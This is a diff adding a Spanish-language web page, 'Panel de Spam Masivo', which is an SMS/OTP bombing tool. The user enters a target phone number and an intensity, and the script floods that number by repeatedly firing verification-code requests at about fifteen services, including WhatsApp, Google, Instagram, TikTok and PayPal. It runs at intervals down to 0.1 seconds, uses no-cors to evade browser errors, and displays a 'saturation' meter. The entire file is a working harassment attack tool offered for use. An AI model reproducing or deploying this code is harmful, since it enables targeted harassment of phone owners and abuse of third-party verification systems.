@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Panel de Spam Masivo</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Courier New', monospace; }
+        body { background: #0a0a0a; color: #00ff00; min-height: 100vh; padding: 20px; }
+        .container { max-width: 800px; margin: 0 auto; }
+        h1 { text-align: center; margin-bottom: 30px; text-transform: uppercase; letter-spacing: 3px; color: #00ff00; text-shadow: 0 0 10px #00ff00; font-size: 2em; }
+        .panel { background: #111111; border: 2px solid #00ff00; border-radius: 10px; padding: 20px; margin-bottom: 20px; box-shadow: 0 0 20px rgba(0, 255, 0, 0.2); }
+        .input-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; color: #00cc00; font-weight: bold; }
+        input, select { width: 100%; padding: 12px; background: #000000; border: 1px solid #00ff00; color: #00ff00; border-radius: 5px; font-size: 16px; }
+        input:focus, select:focus { outline: none; box-shadow: 0 0 10px #00ff00; }
+        .button-group { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 20px; }
+        button { padding: 15px; background: #001100; border: 1px solid #00ff00; color: #00ff00; cursor: pointer; font-weight: bold; text-transform: uppercase; letter-spacing: 2px; transition: all 0.3s; font-size: 16px; }
+        button:hover { background: #00ff00; color: #000000; box-shadow: 0 0 20px #00ff00; }
+        button:disabled { background: #1a1a1a; color: #444444; border-color: #444444; cursor: not-allowed; }
+        button.stop-btn { border-color: #ff0000; color: #ff0000; }
+        button.stop-btn:hover { background: #ff0000; color: #000000; box-shadow: 0 0 20px #ff0000; }
+        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 20px; }
+        .stat-box { background: #000000; border: 1px solid #00ff00; padding: 15px; text-align: center; border-radius: 5px; }
+        .stat-value { font-size: 2em; font-weight: bold; margin-top: 5px; }
+        .saturation-bar { margin-top: 20px; padding: 10px; background: #000000; border: 1px solid #00ff00; }
+        .saturation-fill { height: 30px; background: linear-gradient(90deg, #00ff00, #ffff00, #ff0000); transition: width 0.5s; border-radius: 3px; }
+        .saturation-text { text-align: center; margin-top: 5px; font-weight: bold; }
+        .log-container { background: #000000; border: 1px solid #00ff00; padding: 15px; margin-top: 20px; max-height: 300px; overflow-y: auto; border-radius: 5px; }
+        .log-entry { margin: 5px 0; padding: 5px; border-bottom: 1px solid #003300; font-size: 14px; }
+        .log-info { color: #00ff00; }
+        .log-warning { color: #ffff00; }
+        .log-success { color: #00ffff; font-weight: bold; }
+        .log-error { color: #ff0000; }
+        .saturated-indicator { display: none; text-align: center; padding: 20px; background: #1a0000; border: 2px solid #ff0000; color: #ff0000; font-size: 1.5em; font-weight: bold; animation: blink 1s infinite; border-radius: 10px; margin-top: 20px; }
+        @keyframes blink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0.3; } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>⚡ Panel de Spam Masivo ⚡</h1>
+        
+        <div class="panel">
+            <h2>Configuración de Ataque</h2>
+            <div class="input-group">
+                <label>Número Objetivo:</label>
+                <input type="tel" id="targetNumber" placeholder="+34XXXXXXXXX" required>
+            </div>
+            <div class="input-group">
+                <label>Intensidad:</label>
+                <select id="intensity">
+                    <option value="low">Baja (5 seg)</option>
+                    <option value="medium">Media (1.5 seg)</option>
+                    <option value="high" selected>Alta (0.5 seg)</option>
+                    <option value="max">Máxima (0.1 seg)</option>
+                </select>
+            </div>
+            <div class="button-group">
+                <button id="startBtn" onclick="startAttack()">Iniciar Ataque</button>
+                <button id="stopBtn" class="stop-btn" onclick="stopAttack()" disabled>Detener</button>
+            </div>
+        </div>
+        
+        <div class="panel">
+            <h2>Estadísticas en Tiempo Real</h2>
+            <div class="stats-grid">
+                <div class="stat-box"><div>SMS Enviados</div><div class="stat-value" id="sentCount">0</div></div>
+                <div class="stat-box"><div>Exitosos</div><div class="stat-value" id="successCount">0</div></div>
+                <div class="stat-box"><div>Bloqueados</div><div class="stat-value" id="blockedCount">0</div></div>
+                <div class="stat-box"><div>Fallidos</div><div class="stat-value" id="failedCount">0</div></div>
+            </div>
+            <div class="saturation-bar">
+                <div>Nivel de Saturación:</div>
+                <div class="saturation-fill" id="saturationFill" style="width: 0%"></div>
+                <div class="saturation-text" id="saturationText">0%</div>
+            </div>
+            <div class="saturated-indicator" id="saturatedIndicator">⚠️ ¡NÚMERO SATURADO! ⚠️</div>
+        </div>
+        
+        <div class="panel">
+            <h2>Logs de Ataque</h2>
+            <div class="log-container" id="logContainer">
+                <div class="log-entry log-info">[SISTEMA] Panel listo. El ataque se ejecuta desde tu navegador.</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Estado del ataque
+        let attackActive = false;
+        let sentCount = 0;
+        let successCount = 0;
+        let blockedCount = 0;
+        let failedCount = 0;
+        let saturationLevel = 0;
+        let attackInterval = null;
+        
+        // Servicios OTP para spam
+        const otpServices = [
+            {name: "WhatsApp", url: "https://api.whatsapp.com/send", method: "GET", field: "phone"},
+            {name: "Telegram", url: "https://my.telegram.org/auth/send_password", method: "POST", field: "phone"},
+            {name: "Google", url: "https://accounts.google.com/signup/v2/webcreateaccount", method: "POST", field: "phoneNumber"},
+            {name: "Instagram", url: "https://www.instagram.com/api/v1/accounts/send_signup_sms_code/", method: "POST", field: "phone_number"},
+            {name: "Twitter", url: "https://api.twitter.com/1.1/onboarding/task.json", method: "POST", field: "phone_number"},
+            {name: "TikTok", url: "https://api.tiktok.com/passport/email/phone/send_code/", method: "POST", field: "mobile"},
+            {name: "LinkedIn", url: "https://www.linkedin.com/uas/request-password-reset-v2", method: "POST", field: "phoneNumber"},
+            {name: "Uber", url: "https://auth.uber.com/v2/api/send_otp", method: "POST", field: "phone"},
+            {name: "Amazon", url: "https://www.amazon.com/ap/register", method: "POST", field: "phoneNumber"},
+            {name: "Snapchat", url: "https://accounts.snapchat.com/accounts/send_phone_verification", method: "POST", field: "phoneNumber"},
+            {name: "Netflix", url: "https://www.netflix.com/api/account/password", method: "POST", field: "phone"},
+            {name: "PayPal", url: "https://www.paypal.com/authflow/entry", method: "POST", field: "phoneNumber"},
+            {name: "Discord", url: "https://discord.com/api/v9/auth/verify", method: "POST", field: "phone"},
+            {name: "Steam", url: "https://store.steampowered.com/join/verifyphone", method: "POST", field: "phoneNumber"},
+            {name: "Tinder", url: "https://api.tinder.com/v2/auth/sms/send", method: "POST", field: "phone_number"}
+        ];
+        
+        function log(message, level = 'info') {
+            const logContainer = document.getElementById('logContainer');
+            const entry = document.createElement('div');
+            entry.className = `log-entry log-${level}`;
+            const timestamp = new Date().toLocaleTimeString();
+            entry.innerHTML = `[${timestamp}] ${message}`;
+            logContainer.appendChild(entry);
+            logContainer.scrollTop = logContainer.scrollHeight;
+            
+            // Mantener solo últimos 50 logs
+            while (logContainer.children.length > 50) {
+                logContainer.removeChild(logContainer.firstChild);
+            }
+        }
+        
+        async function sendOtp(number, service) {
+            try {
+                const headers = {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                };
+                
+                let response;
+                
+                if (service.method === 'GET') {
+                    const params = new URLSearchParams({[service.field]: number});
+                    response = await fetch(`${service.url}?${params}`, {headers});
+                } else {
+                    const body = JSON.stringify({[service.field]: number});
+                    response = await fetch(service.url, {
+                        method: 'POST',
+                        headers,
+                        body,
+                        mode: 'no-cors'  // Evitar errores CORS
+                    });
+                }
+                
+                sentCount++;
+                
+                if (response.ok || response.type === 'opaque') {
+                    successCount++;
+                } else if (response.status === 429) {
+                    blockedCount++;
+                    log(`Servicio ${service.name} bloqueado (429)`, 'warning');
+                } else {
+                    failedCount++;
+                }
+                
+            } catch (error) {
+                failedCount++;
+                // No loguear cada error para no saturar
+            }
+        }
+        
+        function updateSaturation() {
+            if (sentCount > 10) {
+                const blockRate = (blockedCount / sentCount) * 100;
+                
+                if (blockRate > 40) saturationLevel = 100;
+                else if (blockRate > 30) saturationLevel = 80;
+                else if (blockRate > 20) saturationLevel = 60;
+                else if (blockRate > 10) saturationLevel = 40;
+                else saturationLevel = Math.min(30, parseInt(blockRate * 3));
+                
+                if (saturationLevel >= 80) {
+                    document.getElementById('saturatedIndicator').style.display = 'block';
+                    log('¡NÚMERO SATURADO! Objetivo alcanzado', 'success');
+                }
+            }
+        }
+        
+        function updateUI() {
+            document.getElementById('sentCount').textContent = sentCount;
+            document.getElementById('successCount').textContent = successCount;
+            document.getElementById('blockedCount').textContent = blockedCount;
+            document.getElementById('failedCount').textContent = failedCount;
+            
+            document.getElementById('saturationFill').style.width = saturationLevel + '%';
+            document.getElementById('saturationText').textContent = saturationLevel + '%';
+        }
+        
+        async function attackCycle(number) {
+            if (!attackActive) return;
+            
+            // Enviar batch de OTPs
+            const batchPromises = [];
+            
+            // Duplicar servicios para más presión
+            const attackServices = [...otpServices, ...otpServices];
+            
+            for (const service of attackServices) {
+                if (!attackActive) break;
+                batchPromises.push(sendOtp(number, service));
+            }
+            
+            await Promise.all(batchPromises);
+            
+            updateSaturation();
+            updateUI();
+            
+            // Log de progreso
+            if (sentCount % 100 === 0 && sentCount > 0) {
+                log(`Enviados: ${sentCount} | Saturación: ${saturationLevel}%`, 'info');
+            }
+        }
+        
+        function startAttack() {
+            const number = document.getElementById('targetNumber').value;
+            const intensity = document.getElementById('intensity').value;
+            
+            if (!number) {
+                log('Introduce un número objetivo', 'error');
+                return;
+            }
+            
+            attackActive = true;
+            sentCount = 0;
+            successCount = 0;
+            blockedCount = 0;
+            failedCount = 0;
+            saturationLevel = 0;
+            
+            document.getElementById('saturatedIndicator').style.display = 'none';
+            document.getElementById('startBtn').disabled = true;
+            document.getElementById('stopBtn').disabled = false;
+            
+            log(`Ataque iniciado contra ${number}`, 'warning');
+            log(`Intensidad: ${intensity}`, 'info');
+            
+            const delays = {
+                low: 5000,
+                medium: 1500,
+                high: 500,
+                max: 100
+            };
+            
+            const delay = delays[intensity] || 500;
+            
+            // Primer ciclo inmediato
+            attackCycle(number);
+            
+            // Ciclos siguientes
+            attackInterval = setInterval(() => {
+                attackCycle(number);
+            }, delay);
+        }
+        
+        function stopAttack() {
+            attackActive = false;
+            
+            if (attackInterval) {
+                clearInterval(attackInterval);
+                attackInterval = null;
+            }
+            
+            document.getElementById('startBtn').disabled = false;
+            document.getElementById('stopBtn').disabled = true;
+            
+            log('Ataque detenido', 'warning');
+            log(`Total enviados: ${sentCount} | Saturación final: ${saturationLevel}%`, 'info');
+        }
+        
+        // Actualizar UI cada segundo
+        setInterval(updateUI, 1000);
+        
+        log('Sistema listo. El ataque se ejecuta desde tu navegador.', 'info');
+    </script>
+</body>
+</html>
